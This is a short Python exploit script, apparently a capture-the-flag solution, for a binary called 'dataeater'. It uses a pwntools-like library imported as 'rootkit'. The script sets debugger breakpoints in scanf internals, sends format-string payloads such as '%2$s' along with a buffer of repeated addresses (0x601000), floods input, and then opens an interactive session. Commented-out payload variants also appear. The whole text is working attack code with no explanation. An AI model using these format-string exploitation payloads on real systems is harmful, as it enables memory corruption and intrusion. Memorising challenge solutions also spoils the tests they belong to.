#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./dataeater')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
b *main+159
continue
ni
b *__vfscanf_internal+5783
b *__vfscanf_internal+11025
b *__gconv_transform_ascii_internal+276
b *__vfscanf_internal+19545
del 4
continue
'''.format(**locals())

libc=SetupLibcELF()

io = start()

# s(b"%37$s%s")
# s(b"%2s \x10\x60\x00")

# sl(b"%d%17$p")
sl(b"%2$s")
sl(b"A"*8 + p(0x601000)*int(0x1f0-0x20))
pause()
sl(b"1"*0x1000)
sl(b"1"*0x1000)
sl(b"1"*0x1000)

io.interactive()

# sl(f"%s %{i}$p")
